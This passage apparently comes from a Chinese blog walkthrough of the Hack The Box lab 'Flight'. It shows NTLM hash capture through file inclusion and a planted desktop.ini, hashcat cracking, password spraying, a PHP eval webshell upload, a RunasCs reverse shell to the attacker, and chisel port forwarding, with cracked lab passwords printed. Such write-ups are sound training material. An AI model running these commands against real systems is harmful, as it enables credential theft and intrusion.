class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ((strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;..&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(strtolower(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>])),<span class="string">&#x27;filter&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;\\&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;htaccess&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;.shtml&#x27;</span>)!==<span class="literal">false</span>)</span><br><span class="line">)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Suspicious Activity Blocked!&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Incident will be reported&lt;/h3&gt;\r\n&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;C:\\xampp\\htdocs\\school.flight.htb\\home.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>SSRF发起SMB请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://school.flight.htb/index.php?view=//10.10.16.12/BFL</span><br></pre></td></tr></table></figure><p>得到NTLMv2如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc_apache::flight:d5bf8d2c6c495f7b:056EEC55DECB7A98AE95A4035C337D4A:010100000000000080156333C353D90175771A5F2C2A58F90000000002000800560050004D00430001001E00570049004E002D003300590036004E00470042005800320052005200370004003400570049004E002D003300590036004E0047004200580032005200520037002E00560050004D0043002E004C004F00430041004C0003001400560050004D0043002E004C004F00430041004C0005001400560050004D0043002E004C004F00430041004C000700080080156333C353D90106000400020000000800300030000000000000000000000000300000BD05FB1B064E54E1A7E420729E19420E898B09DD065D0296F8674AE7D0FEB3500A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310032000000000000000000</span><br></pre></td></tr></table></figure><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到密码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S@Ss!K@*t13</span><br></pre></td></tr></table></figure><p>枚举SMB用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.187 -d flight -u svc_apache -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span> --users</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\svc_apache:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       badpwdcount: 2 desc: H</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      badpwdcount: 1 desc: N</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         badpwdcount: 1 desc: H</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: J</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: K</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\Guest                          badpwdcount: 0 desc: B</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: B</span><br></pre></td></tr></table></figure><p>用户名列表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat users</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">O.Possum</span><br><span class="line">svc_apache</span><br><span class="line">V.Stevens</span><br><span class="line">D.Truff</span><br><span class="line">I.Francis</span><br><span class="line">W.Walker</span><br><span class="line">C.Bum</span><br><span class="line">M.Gold</span><br><span class="line">L.Kein</span><br><span class="line">G.Lors</span><br><span class="line">R.Cold</span><br><span class="line">S.Moon</span><br><span class="line">krbtgt</span><br><span class="line">Guest</span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure><p>测试同密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.187 -d flight -u ./users -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span> --continue-on-success</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\svc_apache:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\S.Moon:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure><p>密码命中用户<code>S.Moon</code></p><p>查看SMB路径权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.187 -u S.Moon -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] IP: 10.10.11.187:445Name: 10.10.11.187</span><br><span class="line">    Disk                                                PermissionsComment</span><br><span class="line">----                                                ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br><span class="line">NETLOGON                                          READ ONLYLogon server share </span><br><span class="line">Shared                                            READ, WRITE</span><br><span class="line">SYSVOL                                            READ ONLYLogon server share </span><br><span class="line">Users                                             READ ONLY</span><br><span class="line">Web                                               READ ONLY</span><br></pre></td></tr></table></figure><p>错误方法</p><p><s>嗨呀，smb分享路径写权限一眼psexec GetShell</s></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py flight.htb/S.Moon:<span class="string">&#x27;S@Ss!K@*t13&#x27;</span>@10.10.11.187</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Requesting shares on 10.10.11.187.....</span><br><span class="line">[-] share &#39;ADMIN$&#39; is not writable.</span><br><span class="line">[-] share &#39;C$&#39; is not writable.</span><br><span class="line">[-] share &#39;NETLOGON&#39; is not writable.</span><br><span class="line">[*] Found writable share Shared</span><br><span class="line">[*] Uploading file gpbkeZsf.exe</span><br><span class="line">[-] Error uploading file gpbkeZsf.exe, aborting.....</span><br><span class="line">[-] Error performing the installation, cleaning up: SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br></pre></td></tr></table></figure><p><s>What the hell?</s></p><p>正确方法</p><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0 -A</span><br></pre></td></tr></table></figure><p>利用写权限上传desktop.ini用于触发SMB请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat desktop.ini</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[.ShellClassInfo]</span><br><span class="line">IconResource&#x3D;\\10.10.*.*\BFL</span><br></pre></td></tr></table></figure><p>上传desktop.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.187/shared -U S.Moon --password=<span class="string">&#x27;S@Ss!K@*t13&#x27;</span></span><br><span class="line">put desktop.ini</span><br></pre></td></tr></table></figure><p>得到NTLMv2如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.bum::flight.htb:e432c50eb3a75399:595CE71063742D2A3FCC6348F3B5782E:010100000000000000909C42D053D90114DEF6163CCF2D770000000002000800510051004E00460001001E00570049004E002D003800430051004900460035005800510038004C004B0004003400570049004E002D003800430051004900460035005800510038004C004B002E00510051004E0046002E004C004F00430041004C0003001400510051004E0046002E004C004F00430041004C0005001400510051004E0046002E004C004F00430041004C000700080000909C42D053D90106000400020000000800300030000000000000000000000000300000BD05FB1B064E54E1A7E420729E19420E898B09DD065D0296F8674AE7D0FEB3500A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310032000000000000000000</span><br></pre></td></tr></table></figure><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到明文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tikkycoll_431012284</span><br></pre></td></tr></table></figure><p>查看SMB路径权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.187 -u c.bum -p Tikkycoll_431012284</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] IP: 10.10.11.187:445Name: 10.10.11.187</span><br><span class="line">    Disk                                                PermissionsComment</span><br><span class="line">----                                                ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br><span class="line">NETLOGON                                          READ ONLYLogon server share </span><br><span class="line">Shared                                            READ, WRITE</span><br><span class="line">SYSVOL                                            READ ONLYLogon server share </span><br><span class="line">Users                                             READ ONLY</span><br><span class="line">Web                                               READ, WRITE</span><br></pre></td></tr></table></figure><p><s>嗨呀，psexec</s></p><p>与之前一样的原因，写入Shared无法反弹Shell<br />本来想试着写入Web的，结果psexec是按顺序尝试写入分享路径，在分享路径Shared尝试失败后就推出了<br />整了半天不知道怎么指定分享路径Web，只能写Webshell了</p><p>Weevely的create_function()不被php8所支持导致Webshell不可用<br />apt-get升级跟github下载项目都不行<br />大概看了一眼issue<br />作者说create_function是在内存中运行的，其他的函数都没有这个效果<br />然后好像就摆烂了？<br />没办法，上蚁剑吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;&#x27;</span> &gt; BFL.php</span><br><span class="line">smbclient //10.10.11.187/web -U c.bum --password=Tikkycoll_431012284</span><br><span class="line"><span class="built_in">cd</span> school.flight.htb</span><br><span class="line">put BFL.php</span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/antonioCoco/RunasCs/">https://github.com/antonioCoco/RunasCs/</a></p></blockquote><p>使用蚁剑上传runascs后运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runascs.exe c.bum Tikkycoll_431012284 powershell -r <span class="number">10</span>.<span class="number">10</span>.*.*:<span class="number">9998</span></span><br></pre></td></tr></table></figure><p>查看user.txt</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> /users/c.bum/desktop/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">970e7b5b8f6e538ede217e98f6e33832</span><br></pre></td></tr></table></figure><h2 id="权限提升-24"><a class="markdownIt-Anchor" href="#权限提升-24"></a> 权限提升</h2><p>收集系统信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Host Name:                 G0</span><br><span class="line">OS Name:                   Microsoft Windows Server 2019 Standard</span><br><span class="line">OS Version:                10.0.17763 N&#x2F;A Build 17763</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Primary Domain Controller</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          Windows User</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00429-00521-62775-AA402</span><br><span class="line">Original Install Date:     7&#x2F;20&#x2F;2021, 11:21:49 AM</span><br><span class="line">System Boot Time:          3&#x2F;10&#x2F;2023, 7:46:45 AM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br><span class="line">Processor(s):              2 Processor(s) Installed.</span><br><span class="line">                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz</span><br><span class="line">                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz</span><br><span class="line">BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8&#x2F;7&#x2F;2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume3</span><br><span class="line">System Locale:             en-us;English (United States)</span><br><span class="line">Input Locale:              it;Italian (Italy)</span><br><span class="line">Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)</span><br><span class="line">Total Physical Memory:     4,095 MB</span><br><span class="line">Available Physical Memory: 2,046 MB</span><br><span class="line">Virtual Memory: Max Size:  5,503 MB</span><br><span class="line">Virtual Memory: Available: 3,361 MB</span><br><span class="line">Virtual Memory: In Use:    2,142 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    flight.htb</span><br><span class="line">Logon Server:              N&#x2F;A</span><br><span class="line">Hotfix(s):                 N&#x2F;A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: vmxnet3 Ethernet Adapter</span><br><span class="line">                                 Connection Name: Ethernet0 2</span><br><span class="line">                                 DHCP Enabled:    No</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.10.11.187</span><br><span class="line">                                 [02]: fe80::c88d:96af:ef3d:fb9f</span><br><span class="line">                                 [03]: dead:beef::c88d:96af:ef3d:fb9f</span><br><span class="line">                                 [04]: dead:beef::250</span><br><span class="line">Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</span><br></pre></td></tr></table></figure><p>查看TCP监听端口</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant | <span class="built_in">findstr</span> TCP | <span class="built_in">findstr</span> <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49690          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49693          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    0.0.0.0:49702          0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    10.10.11.187:53        0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    10.10.11.187:139       0.0.0.0:0              LISTENING       InHost      </span><br><span class="line">TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       InHost</span><br></pre></td></tr></table></figure><p>与nmap扫描结果对比好像多了个8000？</p><p>本机上测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I -v http://10.10.11.187:8000/</span><br></pre></td></tr></table></figure><p>没有响应</p><p>靶机上测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://0.0.0.0:8000/</span><br><span class="line">curl : Unable to connect to the remote server</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:8000/</span><br><span class="line">curl : &lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt; </span><br></pre></td></tr></table></figure><p>估计是要做个端口转发了</p><p><s>用LCX搭端口转发死活搭不上，麻了</s></p><blockquote><p><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p></blockquote><p>本机运行服务端，开启HTTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel_1.8.1_linux_amd64 server -p 8888 --reverse &amp;</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>下载并运行客户端</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri &quot;http://<span class="number">10</span>.<span class="number">10</span>.*.*/chisel_1.<span class="number">8</span>.<span class="number">1</span>_windows_amd64&quot; -OutFile &quot;./chisel.exe&quot;</span><br><span class="line">./chisel.exe client <span class="number">10</span>.<span class="number">10</span>.*.*:<span class="number">8888</span> R:<span class="number">8000</span>:<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure><p>将客户端的127.0.0.1:8000转发至服务端0.0.0.0:8000</p><p>访问<code>http://0.0.0.0:8000/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Physical Path   C:\inetpub\development</span><br></pre></td></tr></table></figure><p>IIS服务，得到路径</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> c:\inetpub\development</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    Directory: C:\inetpub\development</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        3&#x2F;11&#x2F;2023  12:52 PM                development </span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> C:\inetpub\development\development</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 